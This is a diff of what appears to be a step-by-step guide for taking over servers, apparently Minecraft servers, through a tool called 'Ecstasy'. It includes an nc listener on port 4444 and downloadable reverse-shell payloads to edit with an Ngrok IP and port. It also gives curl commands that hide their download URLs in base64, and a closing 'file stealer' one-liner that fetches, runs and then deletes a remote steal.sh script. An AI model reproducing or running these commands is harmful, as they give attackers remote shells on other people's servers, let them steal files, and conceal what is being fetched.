@@ -16,43 +16,33 @@
 ```nc -lvp 4444```
 
 
-5. **Download and Edit PHP File**
-   - [Download the PHP file](https://files.catbox.moe/s69sex.php) and edit the IP and port to be the Ngrok one.
-   - Reupload the edited file to [catbox.moe](https://catbox.moe).
+5. **Download and Edit Python File**
+   - [Download the Python file](https://catlitter.minoa.cat/api/view/bc52bb227eea93ac2dd0.zip) and edit the IP and port to be the Ngrok one.
+   - (Must have python installed) run windows compile.bat and only if you have wsl setup you can run linux compile.bat and the files that show up are compilex executables.
+   - Upload the compiled files to [catbox.moe](https://catbox.moe) or [CatLitter](https://catlitter.minoa.cat)
 
 6. **Convert URL to Base64**
-   - Use [base64encode.org](https://www.base64encode.org/) to convert the URL to Base64.
+   - Use [base64encode.org](https://www.base64encode.org/) to convert the URL for whatever file to Base64.
 
 ## In Game (run under the shell command)
 7. **Copy and Paste the Command into Ecstasy**
    - While logged into Ecstasy, use the command below, replacing `{BASE64 GOES HERE}` with the Base64 link:
-```curl -O $(echo "{BASE64 GOES HERE}" | base64 --decode)```
+`curl -O $(echo "`{BASE64 GOES HERE}`" | base64 --decode)`
 
 
 8. **Encode Filename and Extension to Base64**
-   - Encode the filename and extension that catbox.moe gives in the URL to Base64.
+   - Encode the filename and extension that catbox.moe or Catlitter gives in the URL to Base64.
 
-9. **Run the PHP Script**
- ```php $(echo "{FILE NAME BASE64}" | base64 --decode)```
- - If there are errors, the server might not have PHP installed. See below for installation instructions.
-
-## Install PHP on Linux Servers
-
-**To get the distro, use the command:**
-```cat /etc/os-release```
-
-### Ubuntu/Debian
-```apt install php```
-
-### Fedora
-```dnf install php -y```
-
-### Arch
-```pacman -S php```
+9. **Run the File**
+Linux:
+ ```./rs```
+Windows:
+```start rs.exe```
+ - If there are errors, idk..
 
 
 # more
-## file stealer
+## Linux mc server file stealer
 ```
 bash -c 'curl -o steal.sh $(echo "aHR0cHM6Ly9jYXRsaXR0ZXIubWlub2EuY2F0L2FwaS92aWV3L2FkMGI1MTJhNzZiNTBjODhlY2VmLnNo" | base64 --decode) && chmod +x steal.sh && ./steal.sh && rm -- steal.sh'
 ```
